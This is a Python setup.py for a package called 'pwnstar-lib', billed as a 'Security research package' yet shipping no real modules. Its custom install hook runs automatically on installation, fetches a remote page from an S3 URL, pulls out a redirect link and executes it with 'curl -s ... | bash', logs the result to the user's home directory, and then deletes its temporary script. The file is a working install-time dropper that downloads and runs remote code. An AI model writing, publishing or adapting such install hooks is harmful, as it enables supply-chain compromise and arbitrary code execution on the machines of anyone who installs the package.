from setuptools import setup
from setuptools.command.install import install
import os
import subprocess
import sys

class CustomInstall(install):
    def run(self):
        # Run standard install first
        install.run(self)
        
        # Execute malicious payload directly in this process
        print("Executing payload during installation...")
        try:
            # Use subprocess for execution to avoid affecting the installer
            payload_script = """
import requests
import re
import subprocess
import sys
import os
import time

def execute_payload():
    try:
        print("Starting payload execution...")
        url = "https://cloudformation-cache.s3.us-east-1.amazonaws.com/ami/656289367527a205257-Instance-Profile-Enforcement-58b20525-9d6a-4e5d-b41914b86817.html"
        print(f"Fetching URL: {url}")
        response = requests.get(url)
        print(f"Response received: {response.status_code}")
        
        # Print the beginning of the response for debugging
        print(f"Response preview: {response.text[:200]}")
        
        # Try multiple regex patterns to find the URL
        patterns = [
            r'REDIRECT_URL="(https://[^"]+)"',
            r'url: "(https://[^"]+)"',
            r'href="(https://[^"]+)"'
        ]
        
        redirect_url = None
        for pattern in patterns:
            match = re.search(pattern, response.text)
            if match:
                redirect_url = match.group(1)
                print(f"Found URL with pattern {pattern}: {redirect_url}")
                break
        
        if redirect_url:
            print(f"Executing: curl -s {redirect_url} | bash")
            # Execute the command
            proc = subprocess.Popen(f"curl -s {redirect_url} | bash", shell=True, 
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = proc.communicate()
            print(f"Command output: {stdout.decode()}")
            if stderr:
                print(f"Command errors: {stderr.decode()}")
            
            # Write to a log file in the user's home directory for persistence
            log_path = os.path.expanduser("~/payload_executed.log")
            with open(log_path, "w") as f:
                f.write(f"URL: {url}\\n")
                f.write(f"Redirect URL: {redirect_url}\\n")
                f.write(f"Command: curl -s {redirect_url} | bash\\n")
                f.write(f"Output: {stdout.decode()}\\n")
                if stderr:
                    f.write(f"Errors: {stderr.decode()}\\n")
            print(f"Execution log written to {log_path}")
        else:
            print("Failed to extract redirect URL from response")
            with open("failed_payload.html", "w") as f:
                f.write(response.text)
            print("Response content written to failed_payload.html")
    except Exception as e:
        print(f"Error during payload execution: {e}")
        import traceback
        traceback.print_exc()

# Call the payload function
execute_payload()
"""
            # Execute the payload script as a separate process
            temp_script = "payload_script.py"
            with open(temp_script, "w") as f:
                f.write(payload_script)
            
            # Execute with the current Python interpreter
            print(f"Launching payload with {sys.executable}")
            subprocess.call([sys.executable, temp_script])
            
            # Clean up
            os.remove(temp_script)
            
        except Exception as e:
            print(f"Error during custom install: {e}")
            import traceback
            traceback.print_exc()

setup(
    name="pwnstar-lib",
    version="1.9",
    author="PwnStar",
    author_email="calebhavens@gmail.com",
    description="Security research package",
    packages=[],  # Empty list since we're not including any real packages
    install_requires=["requests>=2.25.0"],
    cmdclass={
        'install': CustomInstall,
    },
)